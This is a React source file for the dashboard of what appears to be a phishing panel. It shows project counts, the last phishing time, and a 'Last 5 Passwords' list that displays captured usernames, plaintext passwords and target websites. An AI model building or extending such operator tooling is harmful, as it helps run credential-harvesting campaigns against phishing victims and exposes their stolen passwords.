import { useState, useEffect } from "react"
import NavBar from "../components/navbar";
import "../css/dashboard.scss"
import axios from "axios"
import { useSelector } from "react-redux"
import Processing from "../components/processing";
import SideBar from "../components/sidebar";
import jwtDecode from "jwt-decode";

function DashBoard() {
    let [isProcessing, setIsProcessing] = useState(true);
    let [dataToShow, setDataToshow] = useState("");
    let [userDetails, setUserDetails] = useState("");


    useEffect(() => {

        let cookieString = document.cookie;
        cookieString = cookieString.split(";")
        let cookies = new Map();
        for(let x of cookieString){
            let temp = x.split("=");
            cookies.set(temp[0], temp[1])
        }

        let jwt = cookies.get("token");

        setUserDetails(jwtDecode(jwt))

        setIsProcessing(true);
        axios.get("/dashboard-data").then((res) => {
            console.log(res.data)
            setDataToshow(res.data)
            setIsProcessing(false)
        }).catch((err) => {
            document.write(err);
            setIsProcessing(false);
        })
    }, [])


    if (useSelector((state) => state.isLoggedIn) == false) {
        window.location = "/login"
        return;
    }

    return (
        isProcessing == true ? <Processing /> :
            <>
                <NavBar />
                <div id="mainContainer" className="container-fluid d-flex">
                    <SideBar />
                    <div className="container-fluid p-4 ">
                        <div className="row mx-4 px-4">
                            <h1 className="px-lg-4 mx-lg-4" style={{ fontSize: "70px", fontFamily: "Roboto", fontWeight: "900" }}>Welcome <span className="fs-1">{userDetails.name}</span></h1>
                        </div>

                        <div className="row d-flex justify-content-center m-4">
                            <div className="col-md-3 border border-1 mx-4 p-4">
                                <div><h1 style={{ fontSize: "50px", fontWeight: "bold" }}>{dataToShow.totalProjects}</h1></div>
                                <div><p className="fs-2">Total Projects</p></div>
                            </div>
                            <div className="col-md-3 border border-1 mx-4 p-4">
                                <div><h1 style={{ fontSize: "50px", fontWeight: "bold" }}>{dataToShow.totalActiveProjects}</h1></div>
                                <div><p className="fs-2">Active Projects</p></div>
                            </div>
                            <div className="col-md-3 border border-1 mx-4 p-4">
                                <div><p style={{ fontSize: "50px", fontWeight: "bold" }}>{dataToShow.totalExpiredProject}</p></div>
                                <div><p className="fs-3">Expired Projects</p></div>
                            </div>

                        </div>

                        <div className="row d-flex justify-content-center m-4">
                            <div className="col-md-3 border border-1 mx-4 p-4">
                                <div><p style={{ fontSize: "50px", fontWeight: "bold" }}>{dataToShow.totalPasswords}</p></div>
                                <div><p className="fs-3">Total Passwords</p></div>
                            </div>
                            <div className="col-md-3 border border-1 mx-4 p-4">
                                <div><p style={{ fontSize: "50px", fontWeight: "bold" }}>{dataToShow.totalWebsites}</p></div>
                                <div><p className="fs-3">Total Websites</p></div>
                            </div>
                            <div className="col-md-3 border border-1 mx-4 p-4">
                                <br />
                                <div><p style={{ fontSize: "18px", fontWeight: "bold" }}>{dataToShow.lastPhishingTiming}</p></div>
                                <br />
                                <div><p className="fs-3">Last Phishing</p></div>
                            </div>

                        </div>
                        <h1 className="text-center my-5">Last 5 Passwords</h1>
                        {
                            dataToShow.last_5_passowrds.map((k, key) => {
                                return (
                                    <div key={key} className="p-lg-5 p-2 w-75 d-block mx-auto border border-1 my-3">
                                        <div className="d-flex justify-content-between"><p><b>UserName : </b></p><p>{k.userName}</p></div>
                                        <div className="d-flex justify-content-between"><p><b>Password : </b></p><p>{k.password}</p></div>
                                        <div className="d-flex justify-content-between"><p><b>Website : </b></p><p>{k.selectedItem}</p></div>
                                        <div className="d-flex justify-content-between"><p><b>TIming : </b></p><p>{new Date(parseInt(k.timing)).toLocaleString()}</p></div>
                                    </div>
                                )
                            })
                        }
                    </div>

                </div>

            </>
    )
}


export default DashBoard;